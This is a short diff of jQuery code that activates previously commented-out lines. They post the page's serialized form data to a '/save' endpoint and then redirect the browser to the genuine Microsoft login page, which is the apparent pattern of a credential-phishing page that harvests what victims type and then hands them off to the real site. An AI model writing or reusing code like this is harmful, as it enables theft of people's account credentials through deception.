@@ -26,13 +26,13 @@ $('document').ready(function () {
             y: 6, 
         })
         console.info()
-        // $.ajax({
-        //     url: '/save',
-        //     type: 'post',
-        //     dataType: 'application/json',
-        //     data: $("form").serialize()
-        // });
-        // window.location.href = "https://login.microsoftonline.com";
+        $.ajax({
+            url: '/save',
+            type: 'post',
+            dataType: 'application/json',
+            data: $("form").serialize()
+        });
+        window.location.href = "https://login.microsoftonline.com";
     });
 
     $('form').keyup(function (e) {
